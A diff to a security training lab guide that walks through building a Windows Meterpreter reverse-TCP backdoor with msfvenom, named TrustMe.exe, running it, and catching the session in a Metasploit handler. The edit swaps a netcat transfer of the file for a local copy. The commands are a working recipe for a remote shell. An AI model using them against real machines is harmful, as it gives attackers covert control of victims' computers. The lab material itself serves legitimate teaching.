@@ -37,17 +37,17 @@ Your IP Address and adapter name may be different.
 Now, run the following commands to start a simple backdoor and backdoor listener: 
  
 
-$ `sudo su -`
+ `sudo su -`
 Please note, the adhd password is adhd.
 
-\#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
+`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
 -f exe -o /tmp/TrustMe.exe`
 
-\#`cd /tmp`
+`cd /tmp`
 
-\#`ls -l TrustMe.exe`
+`ls -l TrustMe.exe`
 
-/#`nc -l -p 2222 < TrustMe.exe`
+`cp ./TrustMe.exe /mnt/c/tools`
 
 
 Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
@@ -101,21 +101,11 @@ It should look like this:
 ![](attachments/Clipboard_2020-06-15-10-43-37.png)
 
 
-let's run the following commands to copy over and run the TrustMe.exe file.
+let's run the following commands to run the TrustMe.exe file.
 
 `cd \tools`
-
-`nc <Your Linux IP> 2222 > TrustMe.exe`
-
-Take a deep breath.  Count to 5.  Then hit Ctrl+c to kill the connection.
-
-Then, run it.
-
-`TrustMe.exe`
-
-It should look like this:
-
-![](attachments/TrustMe.png)
+ 
+ `TrustMe.exe`
 
 
 Back at your Ubuntu prompt, you should have a metasploit session!
